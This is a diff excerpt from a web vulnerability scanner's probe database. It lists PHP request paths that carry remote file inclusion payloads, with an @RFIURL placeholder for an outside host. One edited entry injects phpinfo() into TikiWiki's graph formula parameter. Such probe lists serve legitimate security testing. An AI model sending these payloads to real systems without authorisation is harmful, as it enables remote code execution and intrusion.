@@ -5980,7 +5980,7 @@
 "005985","5292","c","/themes/ubb/login.php?theme=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "005986","5292","c","/themes/ubb/login.php?theme=@RFIURL?","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "005987","5292","c","/thumbnail.php?module=gallery&GLOBALS[PTH][classes]=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
-"005988","5292","c","/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
+"005988","40478","c","/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=@RFIURL","GET","PHP Version","","","","","TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code.","",""
 "005989","5292","c","/timedifference.php?la=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "005990","5292","c","/toolbar.loudmouth.php?mainframe=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "005991","5292","c","/tools/update_translations.php?_SESSION[path]=@RFIURL?","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
